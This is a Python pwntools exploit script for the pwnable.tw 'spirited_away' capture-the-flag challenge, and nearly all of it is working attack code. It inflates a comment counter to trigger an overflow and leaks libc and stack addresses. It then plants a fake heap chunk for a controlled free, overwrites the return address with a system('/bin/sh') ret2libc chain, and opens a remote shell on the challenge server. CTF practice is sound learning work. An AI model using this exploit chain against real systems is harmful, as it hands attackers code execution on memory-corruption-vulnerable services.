#!/home/khanh/.local/share/pipx/venvs/pwntools/bin/python3
from pwn import *

context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e = context.binary = ELF("./spirited_away_patched")
libc = ELF("./libc_32.so.6")

# HELPER
def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)

def connect():
    HOST, PORT = "chall.pwnable.tw", 10204

    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)

    return e.process()

def GDB(p):
    script = '''
    b *0x080486f8
    '''
    gdb.attach(p, gdbscript=script)
    # b *0x80487a0
    # b *0x080486f8
    # 
# OFFSET & VARIABLES

# FUNCTIONS
def comment(p, name, age, reason, cmt):
    p.sendafter(b"Please enter your name: ", B(name))
    p.sendlineafter(b"Please enter your age: ", B(age))
    p.sendafter(b"Why did you came to see this movie? ", B(reason))
    p.sendafter(b"Please enter your comment: ", B(cmt))

def leave_another(p):
    p.sendafter(b"Would you like to leave another comment? <y/n>: ", b"y")

# MAIN
def main():
    p = connect()

    print(f"LIBC BASE -> {hex(libc.address)}")

    for i in range(0, 10):
        comment(p, "A", 1, "A" * 20, "A")
        leave_another(p)

    for j in range(9, 99):
        p.sendlineafter(b"Please enter your name: Please enter your age: ", B(1))
        p.sendafter(b"Why did you came to see this movie? ", b"A")
        leave_another(p)

    # GDB(p)
    comment(p, "A", 1, "A" * 77, "A")

    p.recvline()
    p.recvline()
    s1 = p.recvline()

    libc.address = u32(b"\0" + s1[85:88]) - 0x1b0000
    LEAK_EBP = u32(s1[88:92])
    LEAK_RET = u32(s1[92:96])

    print(f"LIBC BASE -> {hex(libc.address)}")
    print(f"LEAK EBP -> {hex(LEAK_EBP)}")
    print(f"LEAK RET -> {hex(LEAK_RET)}")


    SYSTEM_ADDRESS = libc.symbols["system"]

    print(f"SYSTEM -> {hex(SYSTEM_ADDRESS)}")
    
    leave_another(p)    
    FAKE_CHUNK = p32(0) + p32(0x41) + b"\0" * 0x3c + p32(0x41)
    comment(p, "A", 1, FAKE_CHUNK, b"A" * 80 + p32(1) + p32(LEAK_EBP - 0x70 + 8))
    leave_another(p)

    
    BIN_SH = next(libc.search(b"/bin/sh"))
    EXIT = libc.symbols["exit"]

    print(hex(BIN_SH))


    PAYLOAD = b"A" * 0x4c + p32(SYSTEM_ADDRESS) + p32(EXIT) + p32(BIN_SH)
    comment(p, PAYLOAD, 1, "A", "A")

    p.sendafter(b"Would you like to leave another comment? <y/n>: ", b"n")

    p.interactive()


if __name__ == '__main__':
    main()


'''

cách nhau 32


'''